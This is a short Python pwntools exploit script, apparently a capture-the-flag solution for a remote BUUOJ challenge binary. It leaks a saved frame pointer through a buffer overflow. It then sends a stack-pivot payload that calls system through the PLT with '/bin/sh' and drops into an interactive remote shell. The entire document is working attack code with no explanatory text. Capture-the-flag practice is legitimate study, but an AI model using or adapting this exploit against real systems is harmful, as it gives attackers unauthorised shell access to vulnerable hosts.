from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 28199)
elf = ELF('./pwn')
io.sendline(cyclic(40-1))
io.recvuntil('Hello, ')
io.recv(40)
ebp = u32(io.recv(4))
print(hex(ebp))
buf_addr = ebp - 0x38
payload = p32(elf.plt['system'])        # offset: 0x0
payload += p32(elf.symbols['main'])     # offset: 0x4
payload += p32(buf_addr + 0xC)          # offset: 0x8
payload += b'/bin/sh\x00'               # offset: 0xC
payload += cyclic(0x14)                 # 0ffset: 0x14
payload += p32(buf_addr - 4)            # ebp
payload += p32(0x8048562)               # ret addr: leave; ret
io.send(payload)
io.interactive()